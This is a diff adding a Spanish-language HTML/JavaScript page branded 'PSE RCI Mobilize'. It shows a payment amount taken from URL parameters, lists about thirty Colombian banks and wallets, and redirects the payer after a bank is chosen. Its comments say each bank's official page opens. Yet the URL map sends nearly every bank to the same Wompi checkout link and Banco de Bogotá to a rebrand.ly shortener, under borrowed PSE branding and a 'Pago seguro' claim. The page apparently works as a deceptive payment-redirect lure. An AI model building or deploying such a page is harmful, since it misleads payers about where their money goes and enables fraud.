@@ -1,0 +1,1452 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PSE RCI Mobilize</title>
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
+    background: #f0f2f5;
+    color: #1a1a2e;
+}
+
+/* HEADER */
+.header {
+    height: 80px;
+    background: linear-gradient(135deg, #0a1628 0%, #1a2a4a 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
+}
+
+.logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 28px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+}
+
+/* Ícono PSE */
+.pse-icon {
+    width: 48px;
+    height: 48px;
+    background: #00a859;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+    font-weight: 900;
+    color: #fff;
+    box-shadow: 0 3px 10px rgba(0, 168, 89, 0.35);
+    letter-spacing: -1px;
+}
+
+.logo-text {
+    display: flex;
+    flex-direction: column;
+    line-height: 1.1;
+}
+
+.logo-rci {
+    color: #ffffff;
+    font-size: 22px;
+    font-weight: 800;
+    letter-spacing: 1px;
+}
+
+.logo-mobilize {
+    color: #ff6b00;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+}
+
+/* CONTENEDOR */
+.container {
+    width: 100%;
+    max-width: 650px;
+    margin: 32px auto;
+    padding: 0 16px;
+}
+
+/* TARJETA */
+.card {
+    background: #fff;
+    border-radius: 20px;
+    padding: 32px;
+    box-shadow: 0 8px 30px rgba(10, 22, 40, 0.1);
+    border: 1px solid rgba(10, 22, 40, 0.06);
+}
+
+/* TITULO */
+.title {
+    text-align: center;
+    font-size: 26px;
+    font-weight: 700;
+    color: #0a1628;
+    margin-bottom: 8px;
+}
+
+.subtitle {
+    text-align: center;
+    color: #6b7280;
+    font-size: 14px;
+    margin-bottom: 28px;
+}
+
+/* INPUTS */
+.label {
+    display: block;
+    font-size: 13px;
+    font-weight: 700;
+    color: #1a2a4a;
+    margin-bottom: 8px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+}
+
+.input {
+    width: 100%;
+    height: 52px;
+    border: 2px solid #e2e6ed;
+    border-radius: 12px;
+    padding: 0 16px;
+    font-size: 17px;
+    outline: none;
+    background: #fafbfc;
+    transition: all 0.2s ease;
+    color: #1a1a2e;
+}
+
+.input:focus {
+    border-color: #ff6b00;
+    background: #fff;
+    box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1);
+}
+
+.input[readonly] {
+    background: #f0f2f5;
+    color: #0a1628;
+    font-weight: 700;
+    cursor: default;
+}
+
+.amount {
+    margin-bottom: 26px;
+}
+
+/* BUSCADOR */
+.search {
+    margin-bottom: 12px;
+}
+
+/* LISTA */
+.banks {
+    max-height: 360px;
+    overflow-y: auto;
+    border: 2px solid #e2e6ed;
+    border-radius: 14px;
+    background: #fafbfc;
+}
+
+/* BANCO */
+.bank {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 14px 16px;
+    border-bottom: 1px solid #eef0f4;
+    cursor: pointer;
+    transition: all 0.18s ease;
+    background: #fff;
+}
+
+.bank:last-child {
+    border-bottom: 0;
+}
+
+.bank:hover {
+    background: #f0f7ff;
+}
+
+.bank.selected {
+    background: #e8f0fe;
+    border-left: 5px solid #ff6b00;
+    padding-left: 11px;
+}
+
+/* ICONO */
+.bank-icon {
+    width: 46px;
+    height: 46px;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 13px;
+    font-weight: 800;
+    flex-shrink: 0;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+    letter-spacing: -0.5px;
+}
+
+/* INFORMACIÓN */
+.bank-info {
+    min-width: 0;
+    flex: 1;
+}
+
+.bank-name {
+    font-size: 15px;
+    font-weight: 700;
+    color: #0a1628;
+}
+
+.bank-type {
+    color: #6b7280;
+    font-size: 12px;
+    margin-top: 3px;
+    font-weight: 500;
+}
+
+/* CHECK */
+.check {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    border: 2px solid #d1d5db;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 13px;
+    flex-shrink: 0;
+    transition: all 0.2s ease;
+}
+
+.bank.selected .check {
+    background: #ff6b00;
+    border-color: #ff6b00;
+    box-shadow: 0 2px 8px rgba(255, 107, 0, 0.3);
+}
+
+/* BOTONES */
+.continue {
+    width: 100%;
+    height: 54px;
+    margin-top: 24px;
+    border: 0;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #ff6b00 0%, #e85d00 100%);
+    color: #fff;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    letter-spacing: 0.5px;
+    box-shadow: 0 4px 14px rgba(255, 107, 0, 0.3);
+}
+
+.continue:hover:not(:disabled) {
+    background: linear-gradient(135deg, #e85d00 0%, #cc5200 100%);
+    box-shadow: 0 6px 20px rgba(255, 107, 0, 0.4);
+    transform: translateY(-1px);
+}
+
+.continue:disabled {
+    background: #d1d5db;
+    box-shadow: none;
+    cursor: not-allowed;
+    transform: none;
+}
+
+.back {
+    display: block;
+    width: 100%;
+    margin-top: 16px;
+    border: 0;
+    background: none;
+    color: #1a2a4a;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    padding: 10px;
+    border-radius: 8px;
+    transition: all 0.2s ease;
+}
+
+.back:hover {
+    background: #f0f2f5;
+    color: #ff6b00;
+}
+
+/* CAMBIAR ENTIDAD */
+.change-bank {
+    width: 100%;
+    margin-top: 12px;
+    padding: 12px;
+    border: 2px solid #ff6b00;
+    border-radius: 10px;
+    background: #fff;
+    color: #ff6b00;
+    font-size: 14px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.2s ease;
+}
+
+.change-bank:hover {
+    background: #fff5ed;
+    box-shadow: 0 2px 10px rgba(255, 107, 0, 0.15);
+}
+
+/* RESULTADO */
+.result {
+    display: none;
+    margin-top: 24px;
+    padding: 20px;
+    border: 2px solid #00a859;
+    border-radius: 14px;
+    background: #f0faf4;
+}
+
+.result-title {
+    font-weight: 700;
+    margin-bottom: 14px;
+    color: #0a1628;
+    font-size: 16px;
+}
+
+.result-row {
+    display: flex;
+    justify-content: space-between;
+    gap: 15px;
+    padding: 8px 0;
+    font-size: 14px;
+    border-bottom: 1px solid #d1f0e0;
+}
+
+.result-row:last-child {
+    border-bottom: 0;
+}
+
+.result-row span:first-child {
+    color: #6b7280;
+    font-weight: 500;
+}
+
+.result-row span:last-child {
+    font-weight: 700;
+    color: #0a1628;
+}
+
+/* VACIO */
+.empty {
+    padding: 30px;
+    text-align: center;
+    color: #6b7280;
+    font-size: 14px;
+}
+
+/* FOOTER */
+.footer {
+    text-align: center;
+    color: #6b7280;
+    font-size: 12px;
+    line-height: 1.6;
+    margin: 24px auto 0;
+    max-width: 400px;
+}
+
+.footer strong {
+    color: #0a1628;
+}
+
+/* RESPONSIVE */
+@media (max-width: 600px) {
+    .header {
+        height: 68px;
+    }
+
+    .pse-icon {
+        width: 42px;
+        height: 42px;
+        font-size: 16px;
+        border-radius: 10px;
+    }
+
+    .logo-rci {
+        font-size: 19px;
+    }
+
+    .logo-mobilize {
+        font-size: 9px;
+        letter-spacing: 2.5px;
+    }
+
+    .container {
+        margin: 20px auto;
+        padding: 0 12px;
+    }
+
+    .card {
+        padding: 24px 18px;
+        border-radius: 16px;
+    }
+
+    .title {
+        font-size: 22px;
+    }
+
+    .bank-icon {
+        width: 40px;
+        height: 40px;
+        font-size: 11px;
+    }
+
+    .bank-name {
+        font-size: 14px;
+    }
+
+    .continue {
+        height: 50px;
+        font-size: 15px;
+    }
+}
+</style>
+</head>
+<body>
+
+<header class="header">
+    <div class="logo">
+        <div class="pse-icon">PSE</div>
+        <div class="logo-text">
+            <span class="logo-rci">RCI</span>
+            <span class="logo-mobilize">Mobilize</span>
+        </div>
+    </div>
+</header>
+
+<main class="container">
+
+<section class="card">
+
+    <div class="title">
+        Realiza tu pago
+    </div>
+
+    <div class="subtitle">
+        Selecciona la entidad financiera
+    </div>
+
+    <!-- VALOR -->
+
+    <div class="amount">
+
+        <label
+            class="label"
+            for="amount"
+        >
+            Valor a pagar
+        </label>
+
+        <input
+            id="amount"
+            class="input"
+            type="text"
+            readonly
+            placeholder="$ 0"
+        >
+
+    </div>
+
+    <!-- ENTIDAD -->
+
+    <label class="label">
+        Entidad financiera
+    </label>
+
+    <div
+        class="search"
+        id="searchContainer"
+    >
+
+        <input
+            id="bankSearch"
+            class="input"
+            type="text"
+            placeholder="Buscar banco..."
+            autocomplete="off"
+        >
+
+    </div>
+
+    <!-- BANCOS -->
+
+    <div
+        class="banks"
+        id="banks"
+    ></div>
+
+    <!-- CONTINUAR -->
+
+    <button
+        id="continueBtn"
+        class="continue"
+        disabled
+        type="button"
+    >
+        Continuar
+    </button>
+
+    <!-- VOLVER -->
+
+    <button
+        id="backBtn"
+        class="back"
+        type="button"
+    >
+        ← Volver
+    </button>
+
+    <!-- RESULTADO -->
+
+    <div
+        class="result"
+        id="result"
+    >
+
+        <div class="result-title">
+            Resumen
+        </div>
+
+        <div class="result-row">
+
+            <span>
+                Valor a pagar
+            </span>
+
+            <span id="resultAmount">
+                $ 0
+            </span>
+
+        </div>
+
+        <div class="result-row">
+
+            <span>
+                Entidad
+            </span>
+
+            <span id="resultBank">
+                -
+            </span>
+
+        </div>
+
+    </div>
+
+</section>
+
+<div class="footer">
+
+    <strong>RCI Mobilize</strong> · Pago seguro con PSE<br>
+    Selecciona una entidad financiera para continuar.
+
+</div>
+
+</main>
+
+<script>
+
+/* =========================================================
+   ENTIDADES
+========================================================= */
+
+const entidades = [
+
+    {
+        v:"Nequi",
+        l:"Nequi",
+        icon:"N",
+        color:"#df008d"
+    },
+
+    {
+        v:"Bancolombia",
+        l:"Bancolombia",
+        icon:"B",
+        color:"#ffcf00"
+    },
+
+    {
+        v:"Davivienda",
+        l:"Davivienda",
+        icon:"D",
+        color:"#ed1c24"
+    },
+
+    {
+        v:"Banco de Bogotá",
+        l:"Banco de Bogotá",
+        icon:"BD",
+        color:"#004b87"
+    },
+
+    {
+        v:"Banco Popular",
+        l:"Banco Popular",
+        icon:"BP",
+        color:"#00549c"
+    },
+
+    {
+        v:"Banco de Occidente",
+        l:"Banco de Occidente",
+        icon:"BO",
+        color:"#003b70"
+    },
+
+    {
+        v:"Banco AV Villas",
+        l:"Banco AV Villas",
+        icon:"AV",
+        color:"#0072bc"
+    },
+
+    {
+        v:"Banco Caja Social",
+        l:"Banco Caja Social",
+        icon:"CS",
+        color:"#008f5a"
+    },
+
+    {
+        v:"BBVA Colombia",
+        l:"BBVA Colombia",
+        icon:"BB",
+        color:"#072146"
+    },
+
+    {
+        v:"Scotiabank Colpatria",
+        l:"Scotiabank Colpatria",
+        icon:"SC",
+        color:"#e31837"
+    },
+
+    {
+        v:"Banco Agrario de Colombia",
+        l:"Banco Agrario de Colombia",
+        icon:"BA",
+        color:"#00843d"
+    },
+
+    {
+        v:"Banco GNB Sudameris",
+        l:"Banco GNB Sudameris",
+        icon:"GN",
+        color:"#005b9a"
+    },
+
+    {
+        v:"Banco Falabella",
+        l:"Banco Falabella",
+        icon:"BF",
+        color:"#00a6ce"
+    },
+
+    {
+        v:"Banco Itaú",
+        l:"Banco Itaú",
+        icon:"IT",
+        color:"#ec7000"
+    },
+
+    {
+        v:"Daviplata",
+        l:"Daviplata",
+        icon:"DP",
+        color:"#e60000"
+    },
+
+    {
+        v:"Lulo Bank",
+        l:"Lulo Bank",
+        icon:"L",
+        color:"#4c1d95"
+    },
+
+    {
+        v:"Nu Colombia",
+        l:"Nu Colombia",
+        icon:"Nu",
+        color:"#820ad1"
+    },
+
+    {
+        v:"Rappipay",
+        l:"Rappipay",
+        icon:"RP",
+        color:"#ff1744"
+    },
+
+    {
+        v:"Movii",
+        l:"Movii",
+        icon:"M",
+        color:"#ff0054"
+    },
+
+    {
+        v:"Ualá",
+        l:"Ualá",
+        icon:"U",
+        color:"#162447"
+    },
+
+    {
+        v:"Banco Pichincha",
+        l:"Banco Pichincha",
+        icon:"PI",
+        color:"#0066a1"
+    },
+
+    {
+        v:"Banco W",
+        l:"Banco W",
+        icon:"W",
+        color:"#f28c00"
+    },
+
+    {
+        v:"Banco Mundo Mujer",
+        l:"Banco Mundo Mujer",
+        icon:"MM",
+        color:"#e4007d"
+    },
+
+    {
+        v:"Bancamía",
+        l:"Bancamía",
+        icon:"BM",
+        color:"#008c95"
+    },
+
+    {
+        v:"Confiar Cooperativa Financiera",
+        l:"Confiar Cooperativa Financiera",
+        icon:"C",
+        color:"#006b54"
+    },
+
+    {
+        v:"Cotrafa Cooperativa Financiera",
+        l:"Cotrafa Cooperativa Financiera",
+        icon:"CF",
+        color:"#0067a5"
+    },
+
+    {
+        v:"Coltefinanciera",
+        l:"Coltefinanciera",
+        icon:"CF",
+        color:"#164a84"
+    },
+
+    {
+        v:"Juriscoop",
+        l:"Juriscoop",
+        icon:"J",
+        color:"#009b77"
+    },
+
+    {
+        v:"Pibank",
+        l:"Pibank",
+        icon:"PI",
+        color:"#00a99d"
+    }
+
+];
+
+
+/* =========================================================
+   URL OFICIAL DE CADA ENTIDAD
+========================================================= */
+
+const urlsEntidades = {
+
+    "Nequi":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Bancolombia":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Davivienda":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco de Bogotá":
+        "https://rebrand.ly/rr2i2b1",
+
+    "Banco Popular":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco de Occidente":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco AV Villas":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco Caja Social":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "BBVA Colombia":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Scotiabank Colpatria":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco Agrario de Colombia":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco GNB Sudameris":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco Falabella":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco Itaú":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Daviplata":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Lulo Bank":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Nu Colombia":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Rappipay":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Movii":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Ualá":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco Pichincha":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco W":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Banco Mundo Mujer":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Bancamía":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Confiar Cooperativa Financiera":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Cotrafa Cooperativa Financiera":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Coltefinanciera":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Juriscoop":
+        "https://checkout.wompi.co/l/eXpnVK",
+
+    "Pibank":
+        "https://checkout.wompi.co/l/eXpnVK"
+
+};
+
+
+/* =========================================================
+   ELEMENTOS
+========================================================= */
+
+const amount =
+    document.getElementById("amount");
+
+const bankSearch =
+    document.getElementById("bankSearch");
+
+const banks =
+    document.getElementById("banks");
+
+const continueBtn =
+    document.getElementById("continueBtn");
+
+const backBtn =
+    document.getElementById("backBtn");
+
+const result =
+    document.getElementById("result");
+
+const resultAmount =
+    document.getElementById("resultAmount");
+
+const resultBank =
+    document.getElementById("resultBank");
+
+const searchContainer =
+    document.getElementById("searchContainer");
+
+
+let selectedBank = null;
+
+
+/* =========================================================
+   OBTENER MONTO
+========================================================= */
+
+function obtenerMontoRaw(){
+
+    try{
+
+        const params =
+            new URLSearchParams(
+                window.location.search
+            );
+
+        return (
+
+            params.get("monto") ||
+
+            params.get("amount") ||
+
+            localStorage.getItem(
+                "finalAmount"
+            ) ||
+
+            sessionStorage.getItem(
+                "finalAmount"
+            ) ||
+
+            localStorage.getItem(
+                "total_pagar"
+            ) ||
+
+            sessionStorage.getItem(
+                "total_pagar"
+            ) ||
+
+            ""
+
+        );
+
+    }catch(error){
+
+        return "";
+
+    }
+
+}
+
+
+/* =========================================================
+   CONVERTIR MONTO
+========================================================= */
+
+function convertirMonto(valor){
+
+    if(!valor){
+        return 0;
+    }
+
+    let texto =
+        String(valor)
+        .trim()
+        .replace(/\$/g,"")
+        .replace(/\s/g,"");
+
+
+    if(
+        texto.includes(".") &&
+        texto.includes(",")
+    ){
+
+        texto =
+            texto
+            .replace(/\./g,"")
+            .replace(",",".");
+    }
+
+    else if(
+        texto.includes(",")
+    ){
+
+        texto =
+            texto.replace(",",".");
+    }
+
+    else if(
+        texto.includes(".")
+    ){
+
+        const partes =
+            texto.split(".");
+
+        if(
+            partes.length === 2 &&
+            partes[1].length === 3
+        ){
+
+            texto =
+                texto.replace(".","");
+
+        }
+
+    }
+
+
+    texto =
+        texto.replace(
+            /[^\d.-]/g,
+            ""
+        );
+
+
+    const numero =
+        Number(texto);
+
+
+    return Number.isFinite(numero)
+        ? numero
+        : 0;
+
+}
+
+
+/* =========================================================
+   FORMATO COP
+========================================================= */
+
+function formatCOP(valor){
+
+    const numero =
+        convertirMonto(valor);
+
+    return "$ " +
+        numero.toLocaleString(
+            "es-CO",
+            {
+                minimumFractionDigits:0,
+                maximumFractionDigits:0
+            }
+        );
+
+}
+
+
+/* =========================================================
+   MOSTRAR MONTO
+========================================================= */
+
+function mostrarMonto(){
+
+    const raw =
+        obtenerMontoRaw();
+
+    const numero =
+        convertirMonto(raw);
+
+
+    if(numero > 0){
+
+        amount.value =
+            numero.toLocaleString(
+                "es-CO",
+                {
+                    minimumFractionDigits:0,
+                    maximumFractionDigits:0
+                }
+            );
+
+    }else{
+
+        amount.value = "";
+
+    }
+
+
+    updateButton();
+
+}
+
+
+/* =========================================================
+   RENDERIZAR BANCOS
+========================================================= */
+
+function renderBanks(lista = entidades){
+
+    banks.innerHTML = "";
+
+
+    const listaMostrar =
+        selectedBank
+        ? [selectedBank]
+        : lista;
+
+
+    if(!listaMostrar.length){
+
+        banks.innerHTML = `
+
+            <div class="empty">
+                No se encontró ninguna entidad.
+            </div>
+
+        `;
+
+        return;
+
+    }
+
+
+    listaMostrar.forEach(
+        entidad => {
+
+            const item =
+                document.createElement("div");
+
+
+            item.className =
+                "bank";
+
+
+            if(
+                selectedBank &&
+                selectedBank.v === entidad.v
+            ){
+
+                item.classList.add(
+                    "selected"
+                );
+
+            }
+
+
+            item.innerHTML = `
+
+                <div
+                    class="bank-icon"
+                    style="
+                        background:${entidad.color}
+                    "
+                >
+                    ${entidad.icon}
+                </div>
+
+
+                <div class="bank-info">
+
+                    <div class="bank-name">
+                        ${entidad.l}
+                    </div>
+
+                    <div class="bank-type">
+                        ${
+                            selectedBank
+                            ? "Entidad seleccionada"
+                            : "Entidad financiera"
+                        }
+                    </div>
+
+                </div>
+
+
+                <div class="check">
+                    ✓
+                </div>
+
+            `;
+
+
+            if(!selectedBank){
+
+                item.addEventListener(
+                    "click",
+                    function(){
+
+                        selectedBank =
+                            entidad;
+
+
+                        searchContainer
+                            .style
+                            .display = "none";
+
+
+                        renderBanks();
+
+
+                        updateButton();
+
+                    }
+                );
+
+            }
+
+
+            banks.appendChild(item);
+
+        }
+    );
+
+
+    /*
+     * BOTÓN CAMBIAR ENTIDAD
+     */
+
+    if(selectedBank){
+
+        const changeButton =
+            document.createElement(
+                "button"
+            );
+
+
+        changeButton.type =
+            "button";
+
+
+        changeButton.className =
+            "change-bank";
+
+
+        changeButton.textContent =
+            "Cambiar entidad";
+
+
+        changeButton.addEventListener(
+            "click",
+            function(){
+
+                selectedBank =
+                    null;
+
+
+                bankSearch.value =
+                    "";
+
+
+                searchContainer
+                    .style
+                    .display = "block";
+
+
+                renderBanks(
+                    entidades
+                );
+
+
+                updateButton();
+
+            }
+        );
+
+
+        banks.parentElement
+            .appendChild(
+                changeButton
+            );
+
+    }
+
+}
+
+
+/* =========================================================
+   BUSCAR BANCOS
+========================================================= */
+
+function filtrarBancos(texto){
+
+    const busqueda =
+        String(texto || "")
+        .toLowerCase()
+        .trim();
+
+
+    if(!busqueda){
+
+        return entidades;
+
+    }
+
+
+    return entidades.filter(
+        entidad =>
+            entidad.l
+            .toLowerCase()
+            .includes(busqueda)
+    );
+
+}
+
+
+bankSearch.addEventListener(
+    "input",
+    function(){
+
+        if(selectedBank){
+            return;
+        }
+
+
+        renderBanks(
+            filtrarBancos(
+                bankSearch.value
+            )
+        );
+
+    }
+);
+
+
+/* =========================================================
+   ACTUALIZAR BOTÓN
+========================================================= */
+
+function updateButton(){
+
+    const monto =
+        convertirMonto(
+            amount.value
+        );
+
+
+    continueBtn.disabled =
+        !(monto > 0 && selectedBank);
+
+}
+
+
+/* =========================================================
+   CONTINUAR
+========================================================= */
+
+continueBtn.addEventListener(
+    "click",
+    function(){
+
+        const monto =
+            convertirMonto(
+                amount.value
+            );
+
+
+        if(
+            !monto ||
+            !selectedBank
+        ){
+
+            return;
+
+        }
+
+
+        const url =
+            urlsEntidades[
+                selectedBank.v
+            ];
+
+
+        if(!url){
+
+            alert(
+                "No hay una página configurada para esta entidad."
+            );
+
+            return;
+
+        }
+
+
+        /*
+         * Guardamos los datos por si
+         * posteriormente se necesitan.
+         */
+
+        sessionStorage.setItem(
+            "entidadSeleccionada",
+            selectedBank.v
+        );
+
+
+        sessionStorage.setItem(
+            "montoPago",
+            String(monto)
+        );
+
+
+        /*
+         * REDIRECCIÓN
+         *
+         * Se abre la página oficial
+         * correspondiente a la entidad.
+         */
+
+        window.location.href = url;
+
+    }
+);
+
+
+/* =========================================================
+   VOLVER
+========================================================= */
+
+backBtn.addEventListener(
+    "click",
+    function(){
+
+        if(
+            window.history.length > 1
+        ){
+
+            window.history.back();
+
+        }else{
+
+            window.location.href = "/";
+
+        }
+
+    }
+);
+
+
+/* =========================================================
+   INICIALIZACIÓN
+========================================================= */
+
+renderBanks();
+
+mostrarMonto();
+
+</script>
+
+</body>
+</html>
